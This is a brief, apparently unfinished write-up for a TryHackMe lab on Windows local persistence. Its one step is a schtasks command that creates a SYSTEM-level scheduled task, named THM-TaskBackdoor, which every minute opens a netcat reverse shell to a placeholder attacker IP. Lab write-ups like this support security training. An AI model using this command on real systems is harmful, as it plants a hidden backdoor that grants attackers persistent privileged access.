# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Task Scheduler
1. Started this room's machine
2. `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER>" /ru SYSTEM`
```PowerShell
```
